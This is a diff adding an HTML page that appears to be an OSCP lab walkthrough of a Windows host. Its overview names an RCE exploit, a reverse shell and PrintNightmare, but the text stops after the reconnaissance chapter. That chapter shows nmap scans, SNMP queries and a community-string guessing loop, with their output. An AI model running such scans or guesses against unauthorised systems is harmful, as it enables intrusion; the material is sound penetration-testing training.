@@ -1,0 +1,2021 @@
+<!doctype html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>192.168.103.145 — snmp-mouse · OSCP walkthrough</title>
+<meta name="description" content="Interactive step-by-step OSCP lab walkthrough: a fully filtered TCP scan that hid an SNMP-exposed Windows host, a WiFi Mouse Server 1.7.8.5 RCE (CVE-2022-3218), and PrintNightmare for the escalation. Full commands, reasoning and raw output.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="192.168.103.145 — snmp-mouse · OSCP walkthrough">
+<meta property="og:description" content="UDP/161 SNMP inventory → Mouse Server 1.7.8.5 RCE → PrintNightmare → local admin.">
+<meta name="color-scheme" content="dark light">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>💀</text></svg>">
+<style>
+*,*::before,*::after{box-sizing:border-box}
+:root{
+  --bg:#0a0e13; --bg2:#0f151d; --panel:#0d131b; --line:#1c2836; --line2:#263545;
+  --fg:#dde5ee; --dim:#8697ab; --dim2:#5d6d80;
+  --acc:#3fb950; --acc-dim:#1f6f31; --amber:#d29922; --red:#f85149; --link:#58a6ff;
+  --code:#070a0e; --shadow:0 20px 50px rgba(0,0,0,.45);
+  --mono:ui-monospace,SFMono-Regular,"SF Mono",Menlo,Consolas,"Liberation Mono",monospace;
+  --sans:-apple-system,BlinkMacSystemFont,"Segoe UI",Inter,Roboto,Helvetica,Arial,sans-serif;
+}
+[data-theme="light"]{
+  --bg:#f4f6f9; --bg2:#ffffff; --panel:#ffffff; --line:#e3e8ef; --line2:#d3dae4;
+  --fg:#151b23; --dim:#5a6675; --dim2:#7d8898;
+  --acc:#1a7f37; --acc-dim:#8fd19e; --amber:#9a6700; --red:#cf222e; --link:#0969da;
+  --code:#0d1117; --shadow:0 16px 40px rgba(15,25,40,.10);
+}
+html{scroll-behavior:smooth}
+body{
+  margin:0;background:var(--bg);color:var(--fg);font-family:var(--sans);
+  font-size:16px;line-height:1.62;-webkit-font-smoothing:antialiased;
+}
+a{color:var(--link);text-decoration:none}
+a:hover{text-decoration:underline}
+code{font-family:var(--mono);font-size:.88em}
+.skip{position:absolute;left:-9999px;top:0;background:var(--acc);color:#04120a;padding:10px 16px;z-index:99}
+.skip:focus{left:8px;top:8px}
+
+/* ---------- top bar ---------- */
+.topbar{
+  position:sticky;top:0;z-index:40;display:flex;align-items:center;gap:14px;
+  padding:10px 18px;background:color-mix(in srgb,var(--bg) 88%,transparent);
+  backdrop-filter:blur(14px);border-bottom:1px solid var(--line);
+}
+.brand{display:flex;align-items:center;gap:9px;font-weight:700;letter-spacing:.02em;white-space:nowrap}
+.brand .dot{width:9px;height:9px;border-radius:50%;background:var(--acc);box-shadow:0 0 12px var(--acc)}
+.brand .slash{color:var(--dim2);font-weight:400}
+.brand-sub{color:var(--dim);font-weight:500}
+.search-wrap{position:relative;flex:1;max-width:460px;margin-left:auto}
+#search{
+  width:100%;padding:9px 13px;border-radius:10px;border:1px solid var(--line2);
+  background:var(--bg2);color:var(--fg);font-family:var(--sans);font-size:14px;outline:none;
+}
+#search:focus{border-color:var(--acc);box-shadow:0 0 0 3px color-mix(in srgb,var(--acc) 18%,transparent)}
+.search-count{position:absolute;right:10px;top:50%;transform:translateY(-50%);font-size:11px;color:var(--dim2)}
+.icon-btn{
+  background:var(--bg2);border:1px solid var(--line2);color:var(--fg);border-radius:10px;
+  width:38px;height:38px;font-size:16px;cursor:pointer;line-height:1;
+}
+.icon-btn:hover{border-color:var(--acc)}
+.burger{display:none;background:none;border:1px solid var(--line2);color:var(--fg);border-radius:9px;width:38px;height:38px;font-size:17px;cursor:pointer}
+
+/* ---------- shell ---------- */
+.shell{display:grid;grid-template-columns:296px minmax(0,1fr);gap:0;align-items:start}
+.sidebar{
+  position:sticky;top:59px;height:calc(100vh - 59px);overflow-y:auto;padding:20px 16px 60px;
+  border-right:1px solid var(--line);background:var(--bg);
+}
+.sidebar::-webkit-scrollbar{width:9px}
+.sidebar::-webkit-scrollbar-thumb{background:var(--line2);border-radius:9px}
+
+.card{border:1px solid var(--line);border-radius:14px;padding:14px;background:var(--panel);margin-bottom:16px}
+.card h3{margin:0 0 10px;font-size:11px;letter-spacing:.14em;text-transform:uppercase;color:var(--dim)}
+.progress-track{height:6px;border-radius:99px;background:var(--line);overflow:hidden}
+.progress-fill{height:100%;width:0;background:linear-gradient(90deg,var(--acc-dim),var(--acc));transition:width .35s ease}
+.progress-label{margin-top:9px;font-size:12px;color:var(--dim);display:flex;justify-content:space-between}
+.progress-label b{color:var(--fg)}
+
+.nav-title{font-size:11px;letter-spacing:.14em;text-transform:uppercase;color:var(--dim2);margin:4px 8px 8px}
+.nav-item{
+  display:grid;grid-template-columns:26px 1fr 20px;align-items:center;gap:8px;
+  padding:9px 10px;border-radius:10px;color:var(--fg);font-size:14px;
+  border:1px solid transparent;text-decoration:none;
+}
+.nav-item:hover{background:var(--bg2);text-decoration:none}
+.nav-item.active{background:color-mix(in srgb,var(--acc) 12%,transparent);border-color:color-mix(in srgb,var(--acc) 35%,transparent)}
+.nav-item.active .nav-num{color:var(--acc)}
+.nav-item.done .nav-label{color:var(--dim);text-decoration:line-through}
+.nav-num{font-family:var(--mono);font-size:11px;color:var(--dim2)}
+.nav-check{appearance:none;width:16px;height:16px;border:1.5px solid var(--line2);border-radius:5px;cursor:pointer;margin:0;background:transparent}
+.nav-check:checked{background:var(--acc);border-color:var(--acc)}
+.nav-check:checked::after{content:"✓";display:block;color:#04120a;font-size:12px;line-height:13px;text-align:center;font-weight:700}
+.nav-tools{display:flex;gap:8px;margin-top:12px}
+.ghost{
+  flex:1;background:var(--bg2);border:1px solid var(--line2);color:var(--dim);
+  padding:7px 10px;border-radius:9px;font-size:12px;cursor:pointer;font-family:var(--sans);
+}
+.ghost:hover{color:var(--fg);border-color:var(--acc)}
+.meta-line{display:flex;justify-content:space-between;gap:10px;font-size:12px;padding:5px 0;border-bottom:1px dashed var(--line)}
+.meta-line:last-child{border-bottom:0}
+.meta-line span:first-child{color:var(--dim)}
+.meta-line span:last-child{font-family:var(--mono);font-size:11px;text-align:right}
+
+/* ---------- main ---------- */
+main{padding:34px 36px 90px;max-width:1000px;width:100%}
+
+.hero{margin-bottom:38px}
+.eyebrow{font-size:11px;letter-spacing:.18em;text-transform:uppercase;color:var(--acc);margin-bottom:12px}
+.hero h1{margin:0;font-size:clamp(28px,4vw,44px);line-height:1.12;letter-spacing:-.025em;font-family:var(--sans)}
+.hero h1 .ip{font-family:var(--mono);font-weight:600;font-size:.9em;letter-spacing:-.045em}
+.hero h1 .name{color:var(--dim);font-weight:500}
+.lede{color:var(--dim);font-size:17px;max-width:68ch;margin:14px 0 18px}
+.badges{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:22px}
+.badge{
+  font-size:12px;padding:5px 11px;border-radius:99px;border:1px solid var(--line2);
+  color:var(--dim);background:var(--bg2);font-family:var(--mono);
+}
+.badge.ok{color:var(--acc);border-color:color-mix(in srgb,var(--acc) 40%,transparent);background:color-mix(in srgb,var(--acc) 9%,transparent)}
+.badge.warn{color:var(--amber);border-color:color-mix(in srgb,var(--amber) 40%,transparent);background:color-mix(in srgb,var(--amber) 9%,transparent)}
+
+.chain{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:8px;margin:8px 0 6px}
+.step{
+  position:relative;display:flex;flex-direction:column;gap:3px;padding:12px;border-radius:12px;
+  border:1px solid var(--line);background:var(--panel);color:var(--fg);text-decoration:none;
+  transition:transform .15s ease,border-color .15s ease;
+}
+.step:hover{transform:translateY(-2px);border-color:var(--acc);text-decoration:none}
+.step-num{font-family:var(--mono);font-size:10px;color:var(--acc)}
+.step-label{font-weight:650;font-size:14px}
+.step-desc{font-size:11.5px;color:var(--dim);line-height:1.45}
+.step-desc code{font-size:11px;background:var(--code);padding:1px 4px;border-radius:4px;color:#c9d5e4}
+
+.flags{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:12px;margin:26px 0 10px}
+.flag{border:1px solid var(--line);border-radius:14px;padding:16px;background:var(--panel)}
+.flag .k{font-size:11px;letter-spacing:.12em;text-transform:uppercase;color:var(--dim2);margin-bottom:8px}
+.flag .v{font-family:var(--mono);font-size:14px;word-break:break-all;min-height:22px}
+.flag.revealed .v{color:var(--acc)}
+.flag .reveal{margin-top:10px;background:none;border:0;color:var(--link);font-size:12px;cursor:pointer;padding:0}
+.flag .masked{letter-spacing:.18em;color:var(--dim2)}
+
+/* ---------- chapters ---------- */
+.chapter{scroll-margin-top:78px;margin:0 0 34px;border-top:1px solid var(--line);padding-top:26px}
+.ch-head{display:flex;align-items:flex-start;gap:14px;margin-bottom:6px}
+.ch-num{
+  font-family:var(--mono);font-size:12px;color:var(--acc);border:1px solid color-mix(in srgb,var(--acc) 35%,transparent);
+  background:color-mix(in srgb,var(--acc) 9%,transparent);border-radius:9px;padding:6px 9px;flex:none;
+}
+.ch-title{flex:1;min-width:0}
+.ch-title h2{margin:0;font-size:24px;letter-spacing:-.01em}
+.ch-sub{margin:2px 0 0;color:var(--dim);font-size:13.5px}
+.copyall{flex:none;max-width:140px}
+
+.content{font-size:15.3px}
+.content h3{font-size:18px;margin:0;letter-spacing:-.01em}
+.content h4{font-size:14px;margin:22px 0 8px;color:var(--dim);letter-spacing:.04em;text-transform:uppercase}
+.content p{margin:10px 0}
+.content ul,.content ol{padding-left:22px;margin:10px 0}
+.content li{margin:5px 0}
+.content strong{color:#fff}
+[data-theme="light"] .content strong{color:#000}
+.content code{
+  background:color-mix(in srgb,var(--line2) 42%,transparent);border:1px solid var(--line);
+  padding:.1em .36em;border-radius:5px;color:#e8eff8;white-space:nowrap;
+}
+[data-theme="light"] .content code{color:#0d1520;background:#edf1f6}
+.block pre code,.block pre span{background:none;border:0;padding:0}
+.content td code,.content li code{white-space:normal}
+.content hr{border:0;border-top:1px solid var(--line);margin:26px 0}
+.content blockquote{margin:14px 0;padding:10px 14px;border-left:3px solid var(--amber);background:color-mix(in srgb,var(--amber) 7%,transparent);border-radius:0 8px 8px 0;color:var(--dim)}
+.content blockquote p{margin:4px 0}
+
+.sec{border:1px solid var(--line);border-radius:12px;margin:14px 0;background:color-mix(in srgb,var(--panel) 60%,transparent);overflow:hidden}
+.sec-head{
+  width:100%;display:flex;align-items:center;gap:10px;background:none;border:0;color:var(--fg);
+  padding:12px 15px;font-size:17px;font-weight:650;cursor:pointer;text-align:left;font-family:var(--sans);
+}
+.sec-head:hover{background:var(--bg2)}
+.sec-head::before{content:"";flex:none;width:7px;height:7px;margin-top:-3px;border-right:1.7px solid var(--dim2);border-bottom:1.7px solid var(--dim2);transform:rotate(-45deg);transition:transform .18s ease}
+.sec-head[aria-expanded="true"]::before{transform:rotate(45deg);margin-top:-5px}
+.sec-body{padding:2px 15px 14px}
+.sec-body[hidden]{display:none}
+
+/* tables */
+table{border-collapse:collapse;width:100%;margin:14px 0;font-size:13.5px;display:block;overflow-x:auto}
+th,td{border:1px solid var(--line);padding:8px 11px;text-align:left;vertical-align:top}
+th{background:var(--bg2);font-weight:600;font-size:12px;letter-spacing:.04em;text-transform:uppercase;color:var(--dim)}
+tr:nth-child(even) td{background:color-mix(in srgb,var(--bg2) 55%,transparent)}
+
+/* code cards */
+.block{margin:12px 0;border:1px solid var(--line);border-radius:10px;overflow:hidden;background:var(--code)}
+.block-bar{
+  display:flex;align-items:center;justify-content:space-between;padding:6px 10px;
+  background:#0b1017;border-bottom:1px solid #16202c;
+}
+[data-theme="light"] .block-bar{background:#161b22;border-bottom-color:#232c38}
+.block-tag{font-family:var(--mono);font-size:10px;letter-spacing:.14em;text-transform:uppercase;color:#5f7085}
+.block-cmd .block-tag{color:#3fb950}
+.copy{
+  background:#131c26;border:1px solid #24313f;color:#9fb0c3;border-radius:7px;
+  font-size:11px;padding:3px 9px;cursor:pointer;font-family:var(--sans);
+}
+.copy:hover{color:#fff;border-color:#3fb950}
+.copy.done{color:#3fb950;border-color:#3fb950}
+.block pre{margin:0;padding:13px 15px;overflow-x:auto;font-family:var(--mono);font-size:12.9px;line-height:1.6;color:#c9d5e4}
+.block-out{border-style:dashed}
+.block-out pre{color:#93a3b6}
+.codehilite{background:transparent}
+.codehilite pre{margin:0}
+.highlight .c,.highlight .c1,.highlight .cm{color:#5f7085;font-style:italic}
+.highlight .k,.highlight .kn,.highlight .kd{color:#d2a8ff}
+.highlight .s,.highlight .s1,.highlight .s2,.highlight .sb{color:#7ee787}
+.highlight .nb,.highlight .nf{color:#79c0ff}
+.highlight .nv,.highlight .vi{color:#ffa657}
+.highlight .mi,.highlight .m{color:#ffa657}
+.highlight .o,.highlight .p{color:#c9d5e4}
+.highlight .gp{color:#3fb950;font-weight:700}
+
+footer{margin-top:50px;padding-top:22px;border-top:1px solid var(--line);color:var(--dim2);font-size:12.5px;display:flex;flex-wrap:wrap;gap:14px;justify-content:space-between}
+
+/* toast + top button */
+#toast{
+  position:fixed;left:50%;bottom:26px;transform:translate(-50%,20px);opacity:0;pointer-events:none;
+  background:var(--acc);color:#04120a;padding:9px 16px;border-radius:99px;font-size:13px;font-weight:650;
+  transition:opacity .2s ease,transform .2s ease;z-index:60;
+}
+#toast.show{opacity:1;transform:translate(-50%,0)}
+#toTop{
+  position:fixed;right:22px;bottom:22px;width:42px;height:42px;border-radius:50%;
+  background:var(--panel);border:1px solid var(--line2);color:var(--fg);cursor:pointer;
+  opacity:0;pointer-events:none;transition:opacity .2s ease;z-index:50;font-size:16px;
+}
+#toTop.show{opacity:1;pointer-events:auto}
+#toTop:hover{border-color:var(--acc)}
+
+mark.hit{background:color-mix(in srgb,var(--amber) 45%,transparent);color:inherit;border-radius:3px}
+
+@media (max-width:940px){
+  .shell{grid-template-columns:1fr}
+  .sidebar{
+    position:fixed;inset:59px 0 0 0;height:auto;z-index:35;transform:translateX(-102%);
+    transition:transform .22s ease;width:296px;box-shadow:var(--shadow);
+  }
+  .sidebar.open{transform:none}
+  .burger{display:block}
+  main{padding:24px 18px 80px}
+  .search-wrap{max-width:none}
+  .copyall{display:none}
+  .brand-sub,.brand .slash{display:none}
+}
+@media print{
+  .topbar,.sidebar,#toTop,#toast,.copy,.copyall,.block-bar{display:none!important}
+  .shell{display:block}
+  main{padding:0;max-width:none}
+  body{background:#fff;color:#000}
+  .sec{border:0;margin:0}
+  .sec-head{font-size:14px}
+  .sec-body{display:block!important}
+}
+</style>
+</head>
+<body>
+<a class="skip" href="#main">Skip to content</a>
+
+<header class="topbar">
+  <button class="burger" id="burger" type="button" aria-label="Open navigation">☰</button>
+  <div class="brand"><span class="dot"></span>OSCP<span class="slash">/</span><span class="brand-sub">snmp-mouse</span></div>
+  <div class="search-wrap">
+    <input id="search" type="search" placeholder="Search chapters…   ( / )" autocomplete="off" aria-label="Search chapters">
+    <span class="search-count" id="searchCount"></span>
+  </div>
+  <button class="icon-btn" id="themeBtn" type="button" aria-label="Toggle colour theme" title="Toggle theme">◐</button>
+</header>
+
+<div class="shell">
+  <aside class="sidebar" id="sidebar">
+    <div class="card">
+      <h3>Progress</h3>
+      <div class="progress-track"><div class="progress-fill" id="bar"></div></div>
+      <div class="progress-label"><span><b id="pcount">0 / 9</b> chapters</span><span id="ppct">0%</span></div>
+    </div>
+
+    <div class="nav-title">Chapters</div>
+    <nav><a class="nav-item" href="#ch-01" data-target="ch-01"><span class="nav-num">01</span><span class="nav-label">Reconnaissance</span><input class="nav-check" type="checkbox" data-ch="ch-01" aria-label="Mark Reconnaissance complete"></a>
+<a class="nav-item" href="#ch-02" data-target="ch-02"><span class="nav-num">02</span><span class="nav-label">SNMP enumeration</span><input class="nav-check" type="checkbox" data-ch="ch-02" aria-label="Mark SNMP enumeration complete"></a>
+<a class="nav-item" href="#ch-03" data-target="ch-03"><span class="nav-num">03</span><span class="nav-label">Vulnerability analysis</span><input class="nav-check" type="checkbox" data-ch="ch-03" aria-label="Mark Vulnerability analysis complete"></a>
+<a class="nav-item" href="#ch-04" data-target="ch-04"><span class="nav-num">04</span><span class="nav-label">Foothold</span><input class="nav-check" type="checkbox" data-ch="ch-04" aria-label="Mark Foothold complete"></a>
+<a class="nav-item" href="#ch-05" data-target="ch-05"><span class="nav-num">05</span><span class="nav-label">Enumeration &amp; dead ends</span><input class="nav-check" type="checkbox" data-ch="ch-05" aria-label="Mark Enumeration and dead ends complete"></a>
+<a class="nav-item" href="#ch-06" data-target="ch-06"><span class="nav-num">06</span><span class="nav-label">Privilege escalation</span><input class="nav-check" type="checkbox" data-ch="ch-06" aria-label="Mark Privilege escalation complete"></a>
+<a class="nav-item" href="#ch-07" data-target="ch-07"><span class="nav-num">07</span><span class="nav-label">Flags &amp; cleanup</span><input class="nav-check" type="checkbox" data-ch="ch-07" aria-label="Mark Flags and cleanup complete"></a>
+<a class="nav-item" href="#ch-08" data-target="ch-08"><span class="nav-num">08</span><span class="nav-label">Methodology</span><input class="nav-check" type="checkbox" data-ch="ch-08" aria-label="Mark Methodology complete"></a>
+<a class="nav-item" href="#ch-09" data-target="ch-09"><span class="nav-num">09</span><span class="nav-label">Cheat sheet</span><input class="nav-check" type="checkbox" data-ch="ch-09" aria-label="Mark Cheat sheet complete"></a></nav>
+    <div class="nav-tools">
+      <button class="ghost" id="expandAll" type="button">Expand all</button>
+      <button class="ghost" id="collapseAll" type="button">Collapse all</button>
+    </div>
+    <div class="nav-tools"><button class="ghost" id="resetProgress" type="button">Reset progress</button></div>
+
+    <div class="card" style="margin-top:16px">
+      <h3>Target</h3>
+      <div class="meta-line"><span>Host</span><span>zachary (sysName) / OSCP</span></div>
+      <div class="meta-line"><span>IP</span><span>192.168.103.145</span></div>
+      <div class="meta-line"><span>OS</span><span>Windows 10 2004 · build 19041</span></div>
+      <div class="meta-line"><span>TCP</span><span>1978, 3389 (filtered at first scan)</span></div>
+      <div class="meta-line"><span>UDP</span><span>161</span></div>
+      <div class="meta-line"><span>Result</span><span>local admin adm1n</span></div>
+    </div>
+
+    <div class="card">
+      <h3>Source</h3>
+      <div class="meta-line"><span>Repo</span><span><a href="https://github.com/AV10V/OSCP">AV10V/OSCP</a></span></div>
+      <div class="meta-line"><span>Notes</span><span>markdown</span></div>
+      <div class="meta-line"><span>All labs</span><span><a href="../../main.html">main</a></span></div>
+    </div>
+  </aside>
+
+  <main id="main">
+    <section class="hero" id="overview">
+      <div class="eyebrow">OSCP lab walkthrough</div>
+      <h1><span class="ip">192.168.103.145</span> <span class="name">— snmp-mouse</span></h1>
+      <p class="lede">
+        Every TCP port came back filtered and the box looked dead. It was answering SNMP the whole time — and the inventory it handed over named both the vulnerable package and the precondition that makes a keystroke exploit work: somebody was logged in.
+      </p>
+      <div class="badges">
+        <span class="badge">Windows 10 · 19041</span>
+        <span class="badge">windows/shell/reverse_tcp</span>
+        <span class="badge warn">udp/161 public</span>
+        <span class="badge warn">Mouse Server 1.7.8.5</span>
+        <span class="badge warn">unpatched spooler</span>
+        <span class="badge ok">local admin · proof.txt</span>
+      </div>
+      <div class="chain"><a class="step" href="#ch-01"><span class="step-num">01</span><span class="step-label">Filtered</span><span class="step-desc">all 10 TCP ports <code>filtered</code></span></a>
+<a class="step" href="#ch-02"><span class="step-num">02</span><span class="step-label">UDP 161</span><span class="step-desc">community <code>public</code> → inventory</span></a>
+<a class="step" href="#ch-03"><span class="step-num">03</span><span class="step-label">Analysis</span><span class="step-desc">Mouse Server 1.7.8.5 + live desktop</span></a>
+<a class="step" href="#ch-04"><span class="step-num">04</span><span class="step-label">Foothold</span><span class="step-desc">CVE-2022-3218 → <code>OSCP\offsec</code></span></a>
+<a class="step" href="#ch-05"><span class="step-num">05</span><span class="step-label">1346</span><span class="step-desc">no <code>SeImpersonate</code> — potatoes are out</span></a>
+<a class="step" href="#ch-06"><span class="step-num">06</span><span class="step-label">PrintNightmare</span><span class="step-desc"><code>Invoke-Nightmare</code> → <code>adm1n</code></span></a>
+<a class="step" href="#ch-07"><span class="step-num">07</span><span class="step-label">proof.txt</span><span class="step-desc">RDP as admin, then cleanup</span></a></div>
+      <div class="flags">
+
+      </div>
+    </section>
+
+    <section class="chapter" id="ch-01" data-title="Reconnaissance"><div class="ch-head"><span class="ch-num">01</span><div class="ch-title"><h2>Reconnaissance</h2><p class="ch-sub">Ten filtered ports and a host that was alive</p></div><button class="ghost copyall" type="button">Copy commands</button></div><div class="content"><p>Goal: decide whether the host is alive, what it exposes, and — because the first scan was entirely
+negative — whether that negativity was real.</p>
+<hr />
+<h3>1.1 The scan that said nothing</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>mkdir<span class="w"> </span>-p<span class="w"> </span>~/Desktop/192.168.103.145<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nb">cd</span><span class="w"> </span>~/Desktop/192.168.103.145
+sudo<span class="w"> </span>nmap<span class="w"> </span>-Pn<span class="w"> </span>-sV<span class="w"> </span>-O<span class="w"> </span>--script<span class="o">=</span>vuln*<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-p<span class="w"> </span><span class="m">21</span>,80,135,139,161,445,1978,3389,5986,7680<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span><span class="m">192</span>.168.103.145<span class="w"> </span>-oN<span class="w"> </span><span class="m">192</span>.168.103.145_nmap_vulns.txt
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">Nmap scan report for 192.168.103.145
+Host is up.
+
+PORT     STATE    SERVICE    VERSION
+21/tcp   filtered ftp
+80/tcp   filtered http
+135/tcp  filtered msrpc
+139/tcp  filtered netbios-ssn
+161/tcp  filtered snmp
+445/tcp  filtered microsoft-ds
+1978/tcp filtered unisql
+3389/tcp filtered ms-wbt-server
+5986/tcp filtered wsmans
+7680/tcp filtered pando-pub
+Too many fingerprints match this host to give specific OS details
+
+Nmap done at Fri Nov 20 18:37:45 2026 -- 1 IP address, scanned in 17.14 seconds</span></pre></div>
+<p><strong>Reading it:</strong> <code>Host is up</code> with every port <code>filtered</code> is not "no services". <code>filtered</code> means the
+SYN produced no answer — <code>no-response</code> — so nmap cannot tell an open port from a closed one. On a
+Windows box that is the signature of <code>netsh advfirewall</code> dropping unsolicited inbound, plus a lab
+router. The scan was 17 seconds long because nothing replied to anything; that speed is itself the
+tell that we were being dropped rather than refused.</p>
+<p>Two things to note before moving on:</p>
+<ul>
+<li><strong><code>-Pn</code> was correct.</strong> Without it nmap would have declared the host down and skipped scanning.</li>
+<li><strong><code>-sV</code> had nothing to fingerprint.</strong> "Too many fingerprints match" is nmap admitting it never got
+  a banner, not a real ambiguity.</li>
+</ul>
+<p>Lesson that this box teaches the hard way: a filtered TCP scan is a statement about the firewall.
+It is not evidence that the host has no attack surface — and it says nothing at all about UDP.</p>
+<hr />
+<h3>1.2 The port the scan could not see</h3>
+<p>SNMP is UDP. <code>nmap -p 161</code> scans <strong>TCP</strong>/161 (the SNMP <em>trap</em> port), which is almost never what is
+listening. The service we care about is <code>161/udp</code>:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>sudo<span class="w"> </span>nmap<span class="w"> </span>-sU<span class="w"> </span>-p<span class="w"> </span><span class="m">161</span><span class="w"> </span>--reason<span class="w"> </span><span class="m">192</span>.168.103.145
+</pre></div>
+<p>On this box the answer was immediate and unambiguous — the agent replied to a hand-built request
+even while every TCP port stayed filtered:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>snmpget<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span>-t<span class="w"> </span><span class="m">3</span><span class="w"> </span>-r<span class="w"> </span><span class="m">1</span><span class="w"> </span>-On<span class="w"> </span><span class="m">192</span>.168.103.145<span class="w"> </span><span class="m">1</span>.3.6.1.2.1.1.1.0
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">.1.3.6.1.2.1.1.1.0 = STRING: "Hardware: AMD64 Family 25 Model 1 Stepping 1 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 19041 Multiprocessor Free)"</span></pre></div>
+<p>That single line is the whole recon phase in miniature: the host is Windows, build <strong>19041</strong>, and it
+will talk SNMP to anyone with the community string.</p>
+<hr />
+<h3>1.3 First mistakes, recorded honestly</h3>
+<p>Three commands were run before the working one. Each failure is a lesson, so they stay in.</p>
+<p><strong>(a) No version specified.</strong></p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>snmpwalk<span class="w"> </span><span class="m">192</span>.168.103.145
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">snmpwalk: Timeout</span></pre></div>
+<p>Modern net-snmp defaults to <strong>SNMPv3 noAuthNoPriv</strong>. A v1/v2c agent has no idea what to do with a v3
+message and drops it, so the result is a timeout that looks identical to "wrong community". Always
+state the version explicitly.</p>
+<p><strong>(b) Wrong script — a Linux tree on a Windows host.</strong></p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="m">192</span>.168.103.145<span class="w"> </span><span class="m">1</span>.3.6.1.4.1.8072.1.3.2
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">End of MIB</span></pre></div>
+<p><code>1.3.6.1.4.1.8072</code> is the <strong>net-snmp</strong> enterprise OID. <code>NET-SNMP-EXTEND-MIB</code> only exists on
+Linux/Unix agents; Windows' built-in SNMP service returns end-of-tree. This is a <em>successful</em> walk
+of an empty subtree, not a permission error. Replaying Linux <code>extend</code> tricks against a Windows host
+always lands here.</p>
+<p><strong>(c) Community guessing, badly.</strong></p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="k">for</span><span class="w"> </span>c<span class="w"> </span><span class="k">in</span><span class="w"> </span>kiero<span class="w"> </span>oscp<span class="w"> </span>oscp.exam<span class="w"> </span>student<span class="w"> </span>cl5<span class="w"> </span>lab<span class="w"> </span>zachary<span class="w"> </span>public2<span class="w"> </span>cisco<span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<span class="w">  </span><span class="nb">printf</span><span class="w"> </span><span class="s2">&quot;%-12s &quot;</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$c</span><span class="s2">&quot;</span>
+<span class="w">  </span>snmpget<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$c</span><span class="s2">&quot;</span><span class="w"> </span>-t<span class="w"> </span><span class="m">4</span><span class="w"> </span>-r<span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="m">192</span>.168.103.145<span class="w"> </span><span class="m">1</span>.3.6.1.2.1.1.5.0
+<span class="k">done</span>
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">kiero        Timeout: No Response
+oscp         Timeout: No Response
+oscp.exam    Timeout: No Response
+student      Timeout: No Response
+cl5          Timeout: No Response
+lab          Timeout: No Response
+zachary      Timeout: No Response
+public2      Timeout: No Response
+cisco        Timeout: No Response</span></pre></div>
+<p>Every one timed out — including the <em>working</em> community in a slightly different spelling. Wrong
+communities are dropped silently per RFC, so a timeout tells you nothing except "not this one". Nine
+guesses is also far too small a list to be meaningful; <code>onesixtyone</code> with a real wordlist is the
+right tool when <code>public</code> genuinely fails.</p>
+<p>Here <code>public</code> was already correct. The lesson is to confirm what you have before brute-forcing what
+you don't.</p>
+<hr />
+<h3>1.4 What we entered the enumeration phase with</h3>
+<table>
+<thead>
+<tr>
+<th>Fact</th>
+<th>Value</th>
+<th>Why it matters</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Reachable</td>
+<td>SNMP UDP/161 only</td>
+<td>the TCP firewall is host-side; SNMP was allowed deliberately</td>
+</tr>
+<tr>
+<td>OS</td>
+<td>Windows 10 <strong>19041</strong> (2004)</td>
+<td>out of support since Dec-2021 → assume unpatched</td>
+</tr>
+<tr>
+<td>Hostname</td>
+<td><code>zachary</code></td>
+<td>also <code>sysContact</code> → a human account name, not a service name</td>
+</tr>
+<tr>
+<td>TCP</td>
+<td>all filtered at scan time</td>
+<td>do not conclude "no services" — re-verify later</td>
+</tr>
+<tr>
+<td>RDP</td>
+<td>3389 filtered here, open later</td>
+<td>port state on this box changed between snapshots</td>
+</tr>
+</tbody>
+</table>
+<p>Corroborated later in the session: <code>1978/tcp</code> went from <code>filtered</code> to <code>open</code> after the lab was
+refreshed. <strong>Re-scan before you write a port off.</strong> A snapshot reverting a firewall rule is enough
+to turn a dead box into a shell.</p></div></section>
+<section class="chapter" id="ch-02" data-title="SNMP enumeration"><div class="ch-head"><span class="ch-num">02</span><div class="ch-title"><h2>SNMP enumeration</h2><p class="ch-sub">Processes, software, and the 8072 dead end</p></div><button class="ghost copyall" type="button">Copy commands</button></div><div class="content"><p>Goal: turn one working community string into an inventory — identity, processes, software, users —
+and read that inventory the way you would read a shell's <code>tasklist</code>.</p>
+<hr />
